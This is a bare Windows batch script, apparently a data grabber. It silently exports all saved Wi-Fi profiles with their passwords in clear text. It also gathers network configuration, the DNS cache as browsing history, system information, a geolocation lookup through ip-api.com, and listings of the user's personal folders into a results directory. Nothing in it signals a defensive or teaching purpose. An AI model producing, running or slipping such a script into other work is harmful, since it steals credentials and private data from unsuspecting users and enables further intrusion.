@echo off
if not exist results mkdir results
start /min netsh wlan export profile folder=results key=clear
ipconfig /all > results\ip.txt
for /f "delims=: tokens=2" %%i in ('ipconfig /displaydns^|find "Record Name"') do (find "%%i" /i history.txt >nul 2>&1|| echo %%i >> results\history.txt)
timeout /nobreak 5 >nul 2>&1
sort results\history.txt /o results\history.txt
wmic os get version > results\version.txt
echo %DATE% %TIME% > results\country.txt
powershell /command "(Invoke-WebRequest -Uri 'http://ip-api.com/line').Content" >> results\country.txt
systeminfo > results\info.txt
dir C:\Users\%username%\Desktop > results\screen.txt
dir C:\Users\%username%\Documents >> results\screen.txt
dir C:\Users\%username%\Downloads >> results\screen.txt
dir C:\Users\%username%\Music >> results\screen.txt
dir C:\Users\%username%\OneDrive >> results\screen.txt
dir C:\Users\%username%\Pictures >> results\screen.txt
dir C:\Users\%username%\Videos >> results\screen.txt
exit
